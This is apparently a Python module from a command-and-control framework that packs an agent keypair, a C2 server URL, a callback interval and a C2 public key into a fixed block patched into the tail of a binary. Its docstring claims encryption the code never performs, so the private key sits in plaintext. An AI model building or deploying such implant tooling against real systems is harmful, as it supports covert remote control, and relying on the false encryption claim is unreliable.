"""
Agent configuration handling - 528 bytes total (128 bytes keypair + 400 bytes JSON)
"""
import json
import struct
from typing import Dict, Any, Tuple
from crypto import generate_key_pair, encrypt, decrypt

CONFIG_SIZE = 528
KEYPAIR_SIZE = 128  # 64 bytes each for public and private keys
MAX_JSON_SIZE = 400

def create_config(server_url: str, deploy_id: str, callback_interval: int, c2_public_key: bytes) -> bytes:
    """Create agent configuration with embedded keypair and encrypted JSON"""
    # Generate agent keypair
    agent_public_key, agent_private_key = generate_key_pair()
    
    # Create configuration JSON
    config_data = {
        "server_url": server_url,
        "deploy_id": deploy_id,
        "callback_interval": callback_interval,
        "c2_public_key": c2_public_key.hex()
    }
    
    config_json = json.dumps(config_data).encode('utf-8')
    if len(config_json) > MAX_JSON_SIZE:
        raise ValueError(f"Configuration JSON too large: {len(config_json)} > {MAX_JSON_SIZE}")
    
    # Pad JSON to exactly MAX_JSON_SIZE bytes
    padded_json = config_json.ljust(MAX_JSON_SIZE, b'\x00')
    
    # Combine: 64 bytes public key + 64 bytes private key + 400 bytes JSON
    keypair_data = agent_public_key.ljust(64, b'\x00') + agent_private_key.ljust(64, b'\x00')
    
    return keypair_data + padded_json

def load_config(config_data: bytes) -> Tuple[bytes, bytes, Dict[str, Any]]:
    """Load and parse agent configuration"""
    if len(config_data) != CONFIG_SIZE:
        raise ValueError(f"Invalid configuration size: {len(config_data)} != {CONFIG_SIZE}")
    
    # Extract keypair (first 128 bytes)
    agent_public_key = config_data[:64].rstrip(b'\x00')
    agent_private_key = config_data[64:128].rstrip(b'\x00')
    
    # Extract and parse JSON (remaining 400 bytes)
    json_data = config_data[128:].rstrip(b'\x00')
    config_dict = json.loads(json_data.decode('utf-8'))
    
    # Convert c2_public_key back from hex
    config_dict['c2_public_key'] = bytes.fromhex(config_dict['c2_public_key'])
    
    return agent_public_key, agent_private_key, config_dict

def configure_binary(binary_path: str, config_data: bytes) -> None:
    """Write configuration data to binary file"""
    with open(binary_path, 'r+b') as f:
        # Find the end of the file and append configuration
        f.seek(-CONFIG_SIZE, 2)  # Seek to CONFIG_SIZE bytes from end
        f.write(config_data)

def read_binary_config(binary_path: str) -> bytes:
    """Read configuration data from binary file"""
    with open(binary_path, 'rb') as f:
        f.seek(-CONFIG_SIZE, 2)  # Seek to CONFIG_SIZE bytes from end
        return f.read(CONFIG_SIZE)